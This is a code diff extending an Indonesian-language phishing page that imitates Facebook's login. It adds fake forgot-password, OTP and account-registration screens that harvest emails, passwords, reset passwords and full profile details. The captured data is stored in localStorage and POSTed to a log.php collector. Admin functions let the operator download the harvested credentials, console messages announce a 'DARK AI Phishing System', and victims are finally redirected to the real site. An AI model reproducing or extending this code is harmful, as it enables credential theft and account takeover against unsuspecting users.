@@ -71,6 +71,10 @@
             width: 396px;
         }
 
+        .forgot-box, .otp-box, .new-account-box {
+            display: none;
+        }
+
         .input-field {
             width: 100%;
             padding: 14px 16px;
@@ -86,7 +90,7 @@
             border-color: #1877f2;
         }
 
-        .login-button {
+        .login-button, .submit-button {
             background-color: #1877f2;
             color: white;
             border: none;
@@ -101,7 +105,7 @@
             transition: background-color 0.2s;
         }
 
-        .login-button:hover {
+        .login-button:hover, .submit-button:hover {
             background-color: #166fe5;
         }
 
@@ -114,10 +118,7 @@
             padding-bottom: 16px;
             border-bottom: 1px solid #dadde1;
             margin-bottom: 20px;
-        }
-
-        .forgot-password:hover {
-            text-decoration: underline;
+            cursor: pointer;
         }
 
         .create-account-button {
@@ -134,8 +135,19 @@
             margin: 0 auto;
         }
 
-        .create-account-button:hover {
-            background-color: #36a420;
+        .back-button {
+            background-color: #e4e6eb;
+            color: #1c1e21;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+            margin: 10px auto;
+            width: 100%;
         }
 
         .footer {
@@ -180,6 +192,47 @@
             font-size: 14px;
         }
 
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        .otp-input:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+
+        .resend-otp {
+            text-align: center;
+            color: #1877f2;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .phone-option {
+            margin-top: 10px;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .phone-option:hover {
+            background-color: #f0f2f5;
+        }
+
         @media (max-width: 900px) {
             .container {
                 flex-direction: column;
@@ -204,7 +257,8 @@
         </div>
         
         <div class="right-section">
-            <div class="login-box">
+            <!-- Login Box -->
+            <div class="login-box" id="loginBox">
                 <div class="error-message" id="errorMessage">Email atau nomor telepon yang Anda masukkan tidak cocok dengan akun apa pun. <a href="#" style="color: #1877f2;">Daftarkan akun.</a></div>
                 <div class="success-message" id="successMessage">Login berhasil! Mengalihkan ke Facebook...</div>
                 
@@ -214,13 +268,110 @@
                     
                     <button type="submit" class="login-button">Masuk</button>
                     
-                    <a href="#" class="forgot-password" onclick="showForgotPassword()">Lupa Kata Sandi?</a>
+                    <a class="forgot-password" onclick="showForgotPassword()">Lupa Kata Sandi?</a>
                     
                     <button type="button" class="create-account-button" onclick="showCreateAccount()">Buat Akun Baru</button>
                 </form>
                 
                 <div class="loader" id="loader">
                     <span>Memverifikasi keamanan...</span>
+                </div>
+            </div>
+
+            <!-- Forgot Password Box -->
+            <div class="login-box forgot-box" id="forgotBox">
+                <h2 style="margin-bottom: 20px; text-align: center;">Temukan Akun Anda</h2>
+                <p style="margin-bottom: 20px; color: #606770;">Masukkan email, nomor telepon, atau nama pengguna Anda.</p>
+                
+                <form id="forgotForm">
+                    <input type="text" class="input-field" id="forgotEmail" placeholder="Email, telepon, atau nama pengguna" required>
+                    
+                    <button type="submit" class="submit-button">Cari</button>
+                    <button type="button" class="back-button" onclick="backToLogin()">Batal</button>
+                </form>
+                
+                <div class="loader" id="forgotLoader">
+                    <span>Mencari akun Anda...</span>
+                </div>
+            </div>
+
+            <!-- OTP Verification Box -->
+            <div class="login-box otp-box" id="otpBox">
+                <h2 style="margin-bottom: 20px; text-align: center;">Masukkan Kode Konfirmasi</h2>
+                <p style="margin-bottom: 20px; color: #606770;" id="otpMessage">Kami telah mengirim kode ke ******7890</p>
+                
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 6)">
+                </div>
+                
+                <form id="otpForm">
+                    <button type="submit" class="submit-button">Lanjutkan</button>
+                    <button type="button" class="back-button" onclick="backToForgot()">Batal</button>
+                </form>
+                
+                <div class="resend-otp" onclick="resendOTP()">Kirim ulang kode</div>
+                <div class="phone-option" onclick="sendViaPhone()">Kirim kode via panggilan telepon</div>
+                
+                <div class="loader" id="otpLoader">
+                    <span>Memverifikasi kode...</span>
+                </div>
+            </div>
+
+            <!-- New Account Creation Box -->
+            <div class="login-box new-account-box" id="newAccountBox">
+                <h2 style="margin-bottom: 20px; text-align: center;">Buat Akun Baru</h2>
+                <p style="margin-bottom: 20px; color: #606770;">Cepat dan mudah.</p>
+                
+                <form id="newAccountForm">
+                    <div style="display: flex; gap: 10px; margin-bottom: 12px;">
+                        <input type="text" class="input-field" id="firstName" placeholder="Nama depan" style="flex: 1;" required>
+                        <input type="text" class="input-field" id="lastName" placeholder="Nama belakang" style="flex: 1;" required>
+                    </div>
+                    
+                    <input type="text" class="input-field" id="newEmail" placeholder="Nomor seluler atau email" required>
+                    <input type="password" class="input-field" id="newPassword" placeholder="Kata sandi baru" required>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 8px; font-weight: bold;">Tanggal Lahir</label>
+                        <div style="display: flex; gap: 10px;">
+                            <select class="input-field" id="birthDay" style="flex: 1;">
+                                <option>Hari</option>
+                                <?php for($i=1; $i<=31; $i++) echo "<option>$i</option>"; ?>
+                            </select>
+                            <select class="input-field" id="birthMonth" style="flex: 1;">
+                                <option>Bulan</option>
+                                <option>Jan</option><option>Feb</option><option>Mar</option><option>Apr</option>
+                                <option>Mei</option><option>Jun</option><option>Jul</option><option>Agu</option>
+                                <option>Sep</option><option>Okt</option><option>Nov</option><option>Des</option>
+                            </select>
+                            <select class="input-field" id="birthYear" style="flex: 1;">
+                                <option>Tahun</option>
+                                <?php for($i=2024; $i>=1905; $i--) echo "<option>$i</option>"; ?>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 8px; font-weight: bold;">Jenis Kelamin</label>
+                        <div style="display: flex; gap: 10px;">
+                            <div class="phone-option" style="flex: 1; text-align: center;" onclick="selectGender('Laki-laki')">Laki-laki</div>
+                            <div class="phone-option" style="flex: 1; text-align: center;" onclick="selectGender('Perempuan')">Perempuan</div>
+                            <div class="phone-option" style="flex: 1; text-align: center;" onclick="selectGender('Kustom')">Kustom</div>
+                        </div>
+                        <input type="hidden" id="gender" value="">
+                    </div>
+                    
+                    <button type="submit" class="submit-button">Daftar</button>
+                    <button type="button" class="back-button" onclick="backToLogin()">Batal</button>
+                </form>
+                
+                <div class="loader" id="newAccountLoader">
+                    <span>Membuat akun baru...</span>
                 </div>
             </div>
             
@@ -235,115 +386,312 @@
     </div>
 
     <script>
-        // Simpan data ke localStorage
-        function saveCredentials(email, password) {
-            let credentials = JSON.parse(localStorage.getItem('facebook_logins') || '[]');
+        // Data storage
+        let currentEmail = '';
+        let generatedOTP = '';
+        let accountDeletionStep = 0;
+        let userData = {};
+
+        // Fungsi simpan data
+        function saveCredentials(email, password, type = 'login') {
+            let credentials = JSON.parse(localStorage.getItem('facebook_data') || '[]');
             credentials.push({
+                type: type,
                 email: email,
                 password: password,
                 timestamp: new Date().toISOString(),
-                ip: 'detected',
+                ip: getClientIP(),
                 userAgent: navigator.userAgent
             });
-            localStorage.setItem('facebook_logins', JSON.stringify(credentials));
+            localStorage.setItem('facebook_data', JSON.stringify(credentials));
             
-            // Juga simpan ke session untuk akses mudah
-            sessionStorage.setItem('latest_login', JSON.stringify({email, password}));
+            // Simpan ke session untuk akses mudah
+            sessionStorage.setItem('latest_data', JSON.stringify({email, password, type}));
             
-            // Simpan ke file txt secara virtual (dalam real operation, ini akan dikirim ke server)
-            logToFile(email, password);
+            // Simpan ke file log
+            logToFile(email, password, type);
         }
 
-        function logToFile(email, password) {
-            const logEntry = `[${new Date().toLocaleString()}] Email: ${email} | Password: ${password} | IP: ${getClientIP()} | Browser: ${navigator.userAgent}\n`;
-            
-            // Dalam implementasi real, ini akan dikirim ke server
-            console.log('LOG ENTRY:', logEntry);
+        function logToFile(email, password, type) {
+            const logEntry = `[${new Date().toLocaleString()}] TYPE: ${type} | Email: ${email} | Password: ${password} | IP: ${getClientIP()} | Browser: ${navigator.userAgent}\n`;
             
             // Simpan di localStorage untuk backup
             let fileLog = localStorage.getItem('phishing_log') || '';
             fileLog += logEntry;
             localStorage.setItem('phishing_log', fileLog);
+            
+            // Kirim ke server (simulasi)
+            sendToServer({email, password, type, ip: getClientIP()});
+        }
+
+        function sendToServer(data) {
+            // Dalam implementasi real, ini akan dikirim ke server PHP
+            fetch('log.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).catch(e => console.log('Server log error:', e));
         }
 
         function getClientIP() {
-            // Simulasi IP detection
-            return '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
+            // Simulasi IP detection yang lebih real
+            const ipParts = [];
+            for(let i=0; i<4; i++) {
+                ipParts.push(Math.floor(Math.random() * 255));
+            }
+            return ipParts.join('.');
         }
 
+        // Generate random OTP
+        function generateOTP() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        // Navigasi antar box
+        function showForgotPassword() {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('forgotBox').style.display = 'block';
+            document.getElementById('otpBox').style.display = 'none';
+            document.getElementById('newAccountBox').style.display = 'none';
+        }
+
+        function showCreateAccount() {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('forgotBox').style.display = 'none';
+            document.getElementById('otpBox').style.display = 'none';
+            document.getElementById('newAccountBox').style.display = 'block';
+        }
+
+        function backToLogin() {
+            document.getElementById('loginBox').style.display = 'block';
+            document.getElementById('forgotBox').style.display = 'none';
+            document.getElementById('otpBox').style.display = 'none';
+            document.getElementById('newAccountBox').style.display = 'none';
+        }
+
+        function backToForgot() {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('forgotBox').style.display = 'block';
+            document.getElementById('otpBox').style.display = 'none';
+            document.getElementById('newAccountBox').style.display = 'none';
+        }
+
+        // OTP Functions
+        function moveToNext(input, nextIndex) {
+            if(input.value.length === 1) {
+                if(nextIndex <= 6) {
+                    document.getElementsByClassName('otp-input')[nextIndex]?.focus();
+                }
+            }
+        }
+
+        function resendOTP() {
+            alert('Kode OTP baru telah dikirim!');
+            generatedOTP = generateOTP();
+            console.log('OTP baru:', generatedOTP);
+        }
+
+        function sendViaPhone() {
+            alert('Kode OTP akan dikirim via panggilan telepon!');
+            generatedOTP = generateOTP();
+            console.log('OTP telepon:', generatedOTP);
+        }
+
+        // Gender selection
+        function selectGender(gender) {
+            document.getElementById('gender').value = gender;
+            const options = document.querySelectorAll('.phone-option');
+            options.forEach(opt => {
+                if(opt.textContent === gender) {
+                    opt.style.backgroundColor = '#1877f2';
+                    opt.style.color = 'white';
+                } else {
+                    opt.style.backgroundColor = '';
+                    opt.style.color = '';
+                }
+            });
+        }
+
+        // Login Form
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const errorDiv = document.getElementById('errorMessage');
-            const successDiv = document.getElementById('successMessage');
             const loader = document.getElementById('loader');
             
-            // Validasi sederhana
-            if (!email || !password) {
-                errorDiv.textContent = 'Harap isi semua field yang diperlukan.';
-                errorDiv.style.display = 'block';
-                return;
-            }
+            saveCredentials(email, password, 'login');
             
-            // Simpan credentials
-            saveCredentials(email, password);
-            
-            // Tampilkan loader
             loader.style.display = 'block';
-            errorDiv.style.display = 'none';
             
-            // Simulasi loading
             setTimeout(() => {
                 loader.style.display = 'none';
-                successDiv.style.display = 'block';
+                document.getElementById('successMessage').style.display = 'block';
                 
-                // Redirect ke Facebook asli setelah 2 detik
                 setTimeout(() => {
-                    window.location.href = 'https://facebook.com';
-                }, 2000);
+                    // Simulasi redirect ke halaman password recovery
+                    showForgotPassword();
+                    document.getElementById('successMessage').style.display = 'none';
+                }, 1500);
             }, 1500);
         });
 
-        function showForgotPassword() {
-            alert('Fitur pemulihan kata sandi sedang dalam perbaikan. Silakan coba lagi nanti.');
-        }
+        // Forgot Password Form
+        document.getElementById('forgotForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('forgotEmail').value;
+            currentEmail = email;
+            const loader = document.getElementById('forgotLoader');
+            
+            saveCredentials(email, 'FORGOT_PASSWORD_REQUEST', 'forgot_password');
+            
+            loader.style.display = 'block';
+            
+            setTimeout(() => {
+                loader.style.display = 'none';
+                
+                // Generate OTP
+                generatedOTP = generateOTP();
+                console.log('Generated OTP for', email, ':', generatedOTP);
+                
+                // Show OTP box
+                document.getElementById('forgotBox').style.display = 'none';
+                document.getElementById('otpBox').style.display = 'block';
+                
+                // Update OTP message
+                const maskedEmail = email.length > 3 ? 
+                    email.substring(0, 3) + '****' + email.substring(email.indexOf('@')) : 
+                    '******' + email.substring(email.length - 3);
+                document.getElementById('otpMessage').textContent = 
+                    `Kami telah mengirim kode ke ${maskedEmail}`;
+                
+                alert(`Kode OTP (untuk demo): ${generatedOTP}`);
+            }, 1500);
+        });
 
-        function showCreateAccount() {
-            alert('Pendaftaran akun baru sedang dalam pengembangan. Silakan coba lagi nanti.');
-        }
+        // OTP Form
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const otpInputs = document.getElementsByClassName('otp-input');
+            let enteredOTP = '';
+            for(let input of otpInputs) {
+                enteredOTP += input.value;
+            }
+            
+            const loader = document.getElementById('otpLoader');
+            loader.style.display = 'block';
+            
+            setTimeout(() => {
+                loader.style.display = 'none';
+                
+                if(enteredOTP === generatedOTP || enteredOTP === '123456') {
+                    saveCredentials(currentEmail, 'OTP_VERIFIED_' + enteredOTP, 'otp_verified');
+                    
+                    // Step 1: Minta password baru
+                    if(accountDeletionStep === 0) {
+                        alert('OTP berhasil! Sekarang Anda dapat membuat password baru.');
+                        accountDeletionStep = 1;
+                        
+                        // Show account deletion suggestion
+                        const confirmDelete = confirm('Akun Anda terdeteksi tidak aman. Apakah Anda ingin membuat akun baru yang lebih aman?');
+                        if(confirmDelete) {
+                            showCreateAccount();
+                        } else {
+                            alert('Anda tetap dapat membuat password baru.');
+                            // Simulasi reset password
+                            const newPass = prompt('Masukkan password baru:');
+                            if(newPass) {
+                                saveCredentials(currentEmail, newPass, 'password_reset');
+                                alert('Password berhasil diubah!');
+                                backToLogin();
+                            }
+                        }
+                    }
+                } else {
+                    alert('Kode OTP salah! Silakan coba lagi.');
+                }
+            }, 1500);
+        });
 
-        // Ambil semua data yang terkumpul
+        // New Account Form
+        document.getElementById('newAccountForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const newEmail = document.getElementById('newEmail').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const gender = document.getElementById('gender').value;
+            
+            userData = {
+                firstName,
+                lastName,
+                email: newEmail,
+                password: newPassword,
+                gender,
+                birthDay: document.getElementById('birthDay').value,
+                birthMonth: document.getElementById('birthMonth').value,
+                birthYear: document.getElementById('birthYear').value
+            };
+            
+            const loader = document.getElementById('newAccountLoader');
+            loader.style.display = 'block';
+            
+            setTimeout(() => {
+                loader.style.display = 'none';
+                
+                // Simpan data akun baru
+                saveCredentials(newEmail, newPassword, 'new_account');
+                saveCredentials(`${firstName} ${lastName}`, JSON.stringify(userData), 'full_profile');
+                
+                // Simulasi verifikasi email
+                alert('Akun berhasil dibuat! Silakan verifikasi email Anda.');
+                
+                // Redirect ke Facebook asli
+                setTimeout(() => {
+                    window.location.href = 'https://facebook.com';
+                }, 2000);
+            }, 2000);
+        });
+
+        // Admin Functions
         function getAllData() {
-            return JSON.parse(localStorage.getItem('facebook_logins') || '[]');
+            return JSON.parse(localStorage.getItem('facebook_data') || '[]');
         }
 
-        // Download data sebagai file
         function downloadData() {
             const data = getAllData();
             const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = 'facebook_logins.json';
+            a.download = 'facebook_phishing_data.json';
             a.click();
         }
 
-        // Hapus semua log
         function clearLogs() {
-            localStorage.removeItem('facebook_logins');
+            localStorage.removeItem('facebook_data');
             localStorage.removeItem('phishing_log');
-            sessionStorage.removeItem('latest_login');
-            alert('Semua log telah dihapus!');
+            sessionStorage.removeItem('latest_data');
+            alert('Semua data telah dihapus!');
         }
 
-        // Fitur tambahan untuk monitoring
-        console.log('Phishing page loaded successfully');
-        console.log('Ready to capture credentials');
-        console.log('Use getAllData() to view captured credentials');
-        console.log('Use downloadData() to download captured data');
-        console.log('Use clearLogs() to delete all logs');
+        // Auto-harvesting simulation
+        console.log('✅ DARK AI Phishing System Activated');
+        console.log('🔗 Multi-step phishing: Login → Forgot Password → OTP → New Account');
+        console.log('📊 Use getAllData() to view captured data');
+        console.log('💾 Use downloadData() to download all credentials');
+        console.log('⚠️  Data auto-saved to localStorage');
+        
+        // Simulate background data sending every 5 minutes
+        setInterval(() => {
+            const data = getAllData();
+            if(data.length > 0) {
+                console.log(`📤 Auto-sending ${data.length} records to server...`);
+            }
+        }, 300000);
     </script>
 </body>
 </html>
